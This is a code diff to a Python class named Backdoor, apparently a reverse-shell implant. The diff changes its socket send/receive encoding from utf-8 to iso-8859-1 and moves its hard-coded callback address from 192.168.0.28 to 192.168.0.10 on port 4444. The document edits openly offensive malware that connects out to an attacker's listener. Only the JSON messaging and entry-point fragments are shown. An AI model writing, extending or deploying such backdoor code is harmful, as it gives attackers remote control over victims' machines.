@@ -14,8 +14,8 @@ class Backdoor:
         if type(data) is str:
             json_data = json.dumps(data)
         else:
-            json_data = json.dumps(data.decode('utf-8'))
-        self.connection.send(bytes(json_data, encoding='utf-8'))
+            json_data = json.dumps(data.decode('iso-8859-1'))
+        self.connection.send(bytes(json_data, encoding='iso-8859-1'))
 
     def reliable_receive(self):
         json_data = ''
@@ -24,7 +24,7 @@ class Backdoor:
         while True:
             loop += 1
             try:
-                json_data += self.connection.recv(1024).decode('utf-8')
+                json_data += self.connection.recv(1024).decode('iso-8859-1')
                 return json.loads(json_data)
             except Exception as e:
                 if loop == max_rate:
@@ -50,4 +50,4 @@ class Backdoor:
 
 
 if __name__ == '__main__':
-    Backdoor('192.168.0.28', 4444)
+    Backdoor('192.168.0.10', 4444)
